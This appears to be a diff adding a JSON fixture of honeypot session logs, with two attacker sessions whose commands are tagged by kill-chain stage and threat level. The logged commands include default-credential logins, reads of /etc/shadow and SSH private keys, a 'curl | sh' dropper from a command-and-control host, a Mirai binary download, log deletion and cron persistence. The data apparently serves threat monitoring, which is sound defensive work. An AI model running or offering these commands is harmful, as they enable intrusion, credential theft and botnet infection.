@@ -1,0 +1,186 @@
+[
+  {
+    "id": 903,
+    "ip": "194.26.29.112",
+    "startTime": "2026-10-09T15:10:06.397Z",
+    "lastActivity": "2026-10-09T15:10:10.041Z",
+    "commandCount": 7,
+    "commands": [
+      {
+        "timestamp": "2026-10-09T15:10:06.397Z",
+        "command": "LOGIN: root / default",
+        "stage": "2. Credential Access",
+        "threat": "MEDIUM"
+      },
+      {
+        "timestamp": "2026-10-09T15:10:07.011Z",
+        "command": "id",
+        "stage": "3. Host Discovery",
+        "threat": "MEDIUM"
+      },
+      {
+        "timestamp": "2026-10-09T15:10:07.827Z",
+        "command": "cat /etc/shadow",
+        "stage": "4. Credential Harvesting",
+        "threat": "CRITICAL"
+      },
+      {
+        "timestamp": "2026-10-09T15:10:08.528Z",
+        "command": "cat /etc/passwd",
+        "stage": "4. Credential Harvesting",
+        "threat": "HIGH"
+      },
+      {
+        "timestamp": "2026-10-09T15:10:09.134Z",
+        "command": "curl http://pastebin.fake/dump.sh",
+        "stage": "5. Payload Staging",
+        "threat": "CRITICAL"
+      },
+      {
+        "timestamp": "2026-10-09T15:10:09.641Z",
+        "command": "rm /tmp/systemd-private-xyz.service",
+        "stage": "6. Persistence & Evasion",
+        "threat": "HIGH"
+      },
+      {
+        "timestamp": "2026-10-09T15:10:10.041Z",
+        "command": "exit",
+        "stage": "Session Closed",
+        "threat": "LOW"
+      }
+    ],
+    "maxThreat": "CRITICAL",
+    "killChainStage": "Session Closed",
+    "botnetFamily": "Mirai / Mozi Payload Dropper",
+    "authAttempts": [
+      {
+        "username": "root",
+        "password": "default"
+      }
+    ]
+  },
+  {
+    "id": 901,
+    "ip": "185.220.101.5",
+    "ipIntel": {
+      "origin": "Frankfurt, Germany",
+      "asn": "AS208323 (Tor Exit Relay)",
+      "type": "TOR_EXIT",
+      "threatScore": 95
+    },
+    "startTime": "2026-10-09T15:23:05.870Z",
+    "lastActivity": "2026-10-09T15:25:12.898Z",
+    "commandCount": 16,
+    "commands": [
+      {
+        "timestamp": "2026-10-09T15:23:05.870Z",
+        "command": "LOGIN: root / xc3511",
+        "stage": "2. Credential Access",
+        "threat": "CRITICAL"
+      },
+      {
+        "timestamp": "2026-10-09T15:23:06.483Z",
+        "command": "uname -a",
+        "stage": "3. Host Discovery",
+        "threat": "LOW"
+      },
+      {
+        "timestamp": "2026-10-09T15:23:06.986Z",
+        "command": "id",
+        "stage": "3. Host Discovery",
+        "threat": "MEDIUM"
+      },
+      {
+        "timestamp": "2026-10-09T15:23:07.602Z",
+        "command": "cat /etc/passwd",
+        "stage": "4. Credential Harvesting",
+        "threat": "HIGH"
+      },
+      {
+        "timestamp": "2026-10-09T15:23:08.219Z",
+        "command": "cd /tmp",
+        "stage": "1. Reconnaissance",
+        "threat": "LOW"
+      },
+      {
+        "timestamp": "2026-10-09T15:23:08.934Z",
+        "command": "wget http://185.193.66.19/bins/mirai.arm7",
+        "stage": "5. Payload Staging",
+        "threat": "CRITICAL"
+      },
+      {
+        "timestamp": "2026-10-09T15:23:09.548Z",
+        "command": "touch .bot_payload",
+        "stage": "6. Persistence & Evasion",
+        "threat": "MEDIUM"
+      },
+      {
+        "timestamp": "2026-10-09T15:23:10.060Z",
+        "command": "rm -rf /var/log/syslog",
+        "stage": "6. Persistence & Evasion",
+        "threat": "CRITICAL"
+      },
+      {
+        "timestamp": "2026-10-09T15:23:10.469Z",
+        "command": "exit",
+        "stage": "Session Closed",
+        "threat": "LOW"
+      },
+      {
+        "timestamp": "2026-10-09T15:25:09.221Z",
+        "command": "LOGIN: root / default",
+        "stage": "2. Credential Access",
+        "threat": "MEDIUM"
+      },
+      {
+        "timestamp": "2026-10-09T15:25:09.735Z",
+        "command": "id",
+        "stage": "3. Host Discovery",
+        "threat": "MEDIUM"
+      },
+      {
+        "timestamp": "2026-10-09T15:25:10.453Z",
+        "command": "cat /etc/shadow",
+        "stage": "4. Credential Harvesting",
+        "threat": "CRITICAL"
+      },
+      {
+        "timestamp": "2026-10-09T15:25:11.069Z",
+        "command": "cat /root/.ssh/id_rsa",
+        "stage": "4. Credential Harvesting",
+        "threat": "CRITICAL"
+      },
+      {
+        "timestamp": "2026-10-09T15:25:11.780Z",
+        "command": "curl -s http://c2.threat-actor.su/dropper.sh | sh",
+        "stage": "5. Payload Staging",
+        "threat": "CRITICAL"
+      },
+      {
+        "timestamp": "2026-10-09T15:25:12.383Z",
+        "command": "echo '* * * * * /tmp/.persist' > /etc/cron.d/job",
+        "stage": "6. Persistence & Evasion",
+        "threat": "MEDIUM"
+      },
+      {
+        "timestamp": "2026-10-09T15:25:12.898Z",
+        "command": "exit",
+        "stage": "Session Closed",
+        "threat": "LOW"
+      }
+    ],
+    "maxThreat": "CRITICAL",
+    "killChainStage": "Session Closed",
+    "botnetFamily": "Automated Bot Script",
+    "authAttempts": [
+      {
+        "username": "root",
+        "password": "xc3511"
+      },
+      {
+        "username": "root",
+        "password": "default"
+      }
+    ]
+  }
+]
